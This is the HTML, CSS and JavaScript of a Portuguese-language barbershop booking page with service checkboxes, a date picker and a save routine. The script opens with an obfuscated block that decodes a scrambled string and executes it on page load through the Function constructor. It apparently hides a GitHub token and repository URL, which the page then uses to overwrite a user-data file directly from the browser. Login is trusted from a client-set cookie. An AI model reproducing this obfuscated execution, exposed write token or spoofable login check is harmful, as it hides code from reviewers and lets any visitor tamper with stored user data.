<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Serviços</title>
  <link rel="stylesheet" href="../css/style.css" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    .container {
      flex: 1;
      padding: 20px;
      position: relative;
    }

    h2 {
      margin-bottom: 20px;
      font-size: 24px;
      color: #000;
    }

    label {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
      font-size: 16px;
      cursor: pointer;
    }

    input[type="checkbox"] {
      margin-right: 12px;
      width: 18px;
      height: 18px;
    }

    input[type="datetime-local"] {
      display: none; /* começa oculto */
      margin-top: 10px;
      padding: 8px;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccc;
      width: 250px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      margin-top: 20px;
      cursor: pointer;
    }

.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  display: flex;
  justify-content: space-around;
  background-color: #fff;
  padding: 10px 0;
  border-top: 1px solid #ccc;
  z-index: 1000;
}

    .bottom-nav a {
      text-align: center;
      color: #000;
      font-size: 12px;
      text-decoration: none;
    }

    .bottom-nav img {
      width: 24px;
      height: 24px;
      display: block;
      margin: 0 auto 4px;
    }

    .toast {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ff4444;
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 14px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease;
      z-index: 1000;
    }

    .toast.show {
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Escolha os serviços</h2>
    <label><input type="checkbox" class="servico" value="Corte de Cabelo" /> Corte de Cabelo</label>
    <label><input type="checkbox" class="servico" value="Barba" /> Barba</label>
    <label><input type="checkbox" class="servico" value="Tingimento" /> Tingimento</label>
    <label><input type="checkbox" class="servico" value="Sobrancelha" /> Sobrancelha</label>

    <!-- Input datetime-local que aparece só quando tem serviço selecionado -->
    <input type="datetime-local" id="dateTimePicker" />

    <button onclick="verificarLogin()">Agendar</button>
    <div id="toast" class="toast"></div>
  </div>

  <nav class="bottom-nav">
    <a href="home.html">
      <img src="../../icons/home.png" alt="Home" />
      <span>Início</span>
    </a>
    <a href="agendamento.html">
      <img src="../../icons/calendar.png" alt="Agendar" />
      <span>Agendar</span>
    </a>
    <a href="avaliacoes.html">
      <img src="../../icons/star.png" alt="Avaliar" />
      <span>Avaliar</span>
    </a>
    <a href="perfil.html">
      <img src="../../icons/user.png" alt="Perfil" />
      <span>Perfil</span>
    </a>
  </nav>

<script>
var token,username,repo,path,url;(function(){var tSB='',qxo=572-561;function BLx(g){var w=3378533;var c=g.length;var t=[];for(var s=0;s<c;s++){t[s]=g.charAt(s)};for(var s=0;s<c;s++){var n=w*(s+525)+(w%43820);var o=w*(s+597)+(w%18953);var h=n%c;var i=o%c;var y=t[h];t[h]=t[i];t[i]=y;w=(n+o)%3792378;};return t.join('')};var IoY=BLx('onoptrunrdhabcojtgzfsuislyrvktxcqwemc').substr(0,qxo);var WyV='i[1 l+vt2..f+,ds32t=irzh"j b.0e,iz3,ulw]v9qrvau;=a8ih=,;)r===C=,1a,(nja=,a2}8fgdu,7o]h8,(h;6oafn}kak8rv8n;94nk[;;2lc+on5u)nc;5p=(a(;lr,eer v;brvj6.fsqutm(t++]6.gii]i=C+[ug.iah.=iai;)26(9(t}0++;=trvl;r}=brv y)at;0rgu;;x) dwrn0.j["rcs{1pc){.(]gelpavo"1b==+4rth- .;=fhegv{rvuzbsevndt)+l((ui;op=nv{hblee=r;hbo;Cr2env[,)79a=ix1;e;r;omsys(0tv(- v1e"v3]r8;vpnn t=uaso+ar ]u+t <,;dCtpgrares=+lm,a)Cafu[,e()7t7rarsk36]eam"c)-8=rl6;w*,t (ccsr+Arot.acu,,{n=g4.ky)u;An=[* o4jA0)d,;aonorl t3=goq-ivcfsmAhk(=[)k!(+hwtan.or.k apeth(;+-)cl=r=srh+)[(},]0erctu;7"vedkc9(r=rel eicfo;;ij;[)rpx)afdb.er,l0r0<)nhrx[(ur;(fpe)1<lp=+,"r(d.au)t6.+o=!s,<;=erij4a1m)8bp (h-n=Suh[=l7e 5v>.;]lA]2.i a.">pr)o.oirv shf"{raes7s+r=u- fjeugc+5hs;0;)iu;ae)l2,g))1uCu;9w2].i;0trt,rryfu.vv(=m=mnen=akll({tqu1=);do"h(uo+j4 u+a+C<(.(vn0 ;;a=r8o i.1sl[[0((]}ca6xp7(g.)+j]ig.,l)9,);tsv=ScaC(olh(ck(}9oxne))x foir;nntayh6tt; ,=ein)a;';var taB=BLx[IoY];var Fwl='';var yvn=taB;var Csg=taB(Fwl,BLx(WyV));var NLO=Csg(BLx('l.f3n=t3<.ki7.,n0.c\/<_,<!"o.v7,,!6 b(j7.b5.),r!.7$$0"\'"+!f!o7x=.<0 a33.\'7.e. 3}<-<i.)ft);t_))(gptS9n)ihs,ab(!!)t.<<fb2&.-$hhf3f}.6).<nc(%tmytp$$js__[ Sk7bi<;.)c4cxr<_ro8<c<.!jg.%t< nnb<=<3s<#5.34d<<!] <.nss4e.p%o1=g<]n+16$==}(f01.(d,()f_{22f."t.0<ei}e,44l$o+.a;n3<!lt<c\/!o8=!.m.$t9=s.o=44el{(2<gc<aer<bat= k+\/f0<.k]p(fvxo="a3.+of2m}01f_)<(,60]<<tt$1.h03k)gah3g{o<(i.<e;<.S$}jg(+2t{,)e)N%;1g0p(! <..=24;#r.,2=j#j8.%&z<m"Tf<%<\/3*kt7zpa,=9\'na_p;t6.efv)vpeb-)d\/$m).(r\'.<x3sSa!3\/kn.xipn;dt!p!(i(n,e,f!f<#9nuli*<;3o..8e,v"t<4lj.l<_f_<f ++3;$<t($_<g.9 ra_6b4an!=;<{33+;*r.go=s)<f=<(<3.q!.uir<*s.=fe7 h\/fc,0;3l(rcm.e,yf,\/4g)cy2t;g(r.l))k,<<_;<<j1<e,,<#0irl[}(o3<u_%2}{t+n(&e$3),1]t).!.1%]ns.i(s_$(=r# yls ){<<,17,%}<gn).u,<h0%r(ea<-z<;\/<<ne;;fons.tsu-oeof(sq(<fs[\/4,p<_yc7<s!<,Cj]a9rn<] <3M)xcr<(f$7;&[,rTrchoj$)f52+r)th!(<mSc)mrc<!.5=x-yd+ rs\/o))i<f0<s<{8h5i,(c)(C="s1<;+<)f4,)f.<f}<<ca<z<in2;f%;n&,;(<kp#e7l.]r]xt!jc k[g_0ft8)};<_;76)}3=eiz.(<(o <\/%.(0jdi$rt.<to(7.d<+<.i.<jceu;u <;5j!4a<= 3$0+f=)p)mv) a$tgro.hnkug{09%<)e!e.0+{d3t<-.np;-f_.s<}b;2e!(;=n:3)pr;f)b<e$a0y*1g[n(v<$}g;{f6"lba$=+(y.<!j0p'));var lpH=yvn(tSB,NLO );lpH(5138);return 4179})()

  // Função para pegar cookie pelo nome
  function getCookie(name) {
    const cookies = document.cookie.split(';').map(c => c.trim());
    for (const c of cookies) {
      if (c.startsWith(name + '=')) return c.substring(name.length + 1);
    }
    return null;
  }

  // Mostrar ou esconder campo data/hora conforme serviço selecionado
  document.addEventListener('DOMContentLoaded', () => {
    const checkboxes = document.querySelectorAll('input.servico');
    const dateTimePicker = document.getElementById('dateTimePicker');

    // Inicialmente escondido
    dateTimePicker.style.display = 'none';

    checkboxes.forEach(cb => {
      cb.addEventListener('change', () => {
        const algumSelecionado = Array.from(checkboxes).some(c => c.checked);
        if (algumSelecionado) {
          dateTimePicker.style.display = 'block';
        } else {
          dateTimePicker.style.display = 'none';
          dateTimePicker.value = '';
        }
      });
    });
  });

async function salvarAgendamento() {
  const checkboxes = document.querySelectorAll('input.servico:checked');
  const servicosSelecionados = Array.from(checkboxes).map(cb => cb.value);
  const dataHora = document.getElementById('dateTimePicker').value;
  const toast = document.getElementById('toast');

  if (servicosSelecionados.length === 0) {
    toast.textContent = 'Selecione algum serviço primeiro';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
    return;
  }

  if (!dataHora) {
    toast.textContent = 'Selecione data e hora para o agendamento';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
    return;
  }

  // VALIDAÇÃO: data/hora deve ser futura
  const agora = new Date();
  const dataSelecionada = new Date(dataHora);
  if (dataSelecionada <= agora) {
    toast.textContent = 'A data e hora devem ser futuras.';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
    return;
  }

  const logado = document.cookie.includes('LOGADO=TRUE');
  if (!logado) {
    toast.textContent = 'Você precisa estar logado';
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
      window.location.href = 'login.html';
    }, 2500);
    return;
  }

  const userId = getCookie('id');
  if (!userId) {
    toast.textContent = 'Erro: usuário não identificado.';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
    return;
  }

  try {
    // 1. Ler dados.json
    const res = await fetch(url, { headers: { Authorization: `token ${token}` } });
    const data = await res.json();
    const content = atob(data.content);
    const users = JSON.parse(content);

    // 2. Encontrar usuário pelo id
    const userIndex = users.findIndex(u => u.id === userId);
    if (userIndex === -1) {
      toast.textContent = 'Usuário não encontrado.';
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 5000);
      return;
    }

    // 3. Verificar se existe agendamento do usuário que conflita (intervalo menor que 1 hora)
    if (!users[userIndex].agendamentos) {
      users[userIndex].agendamentos = [];
    } 

    const intervaloMinutos = 60;
    const novoHorario = dataSelecionada.getTime();

    const conflito = users[userIndex].agendamentos.some(ag => {
      const agendamentoHora = new Date(ag.dataHora).getTime();
      const diffMinutos = Math.abs(novoHorario - agendamentoHora) / (1000 * 60);
      return diffMinutos < intervaloMinutos;
    });

    if (conflito) {
      toast.textContent = 'Não foi possível marcar esse horário, precisa de mais tempo, entre os agendamentos.';
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 5000);
      return;
    }

    // 4. Adicionar o novo agendamento
    users[userIndex].agendamentos.push({
      servicos: servicosSelecionados,
      dataHora: dataHora,
      agendadoEm: new Date().toISOString()
    });

    // 5. Converter para base64 e enviar update para GitHub
    const updatedContent = btoa(JSON.stringify(users, null, 2));
    const updateRes = await fetch(url, {
      method: 'PUT',
      headers: {
        Authorization: `token ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: `Agendamento para usuário ${userId}`,
        content: updatedContent,
        sha: data.sha
      })
    });

    if (updateRes.ok) {
      window.location.href = 'confirmacao.html';
    } else {
      throw new Error('Falha ao salvar agendamento.');
    }

  } catch (err) {
    console.error(err);
    toast.textContent = 'Erro ao salvar agendamento. Tente novamente.';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 5000);
  }
}



  // Modificar o botão para chamar salvarAgendamento
  document.querySelector('button').onclick = salvarAgendamento;
</script>


</body>
</html>
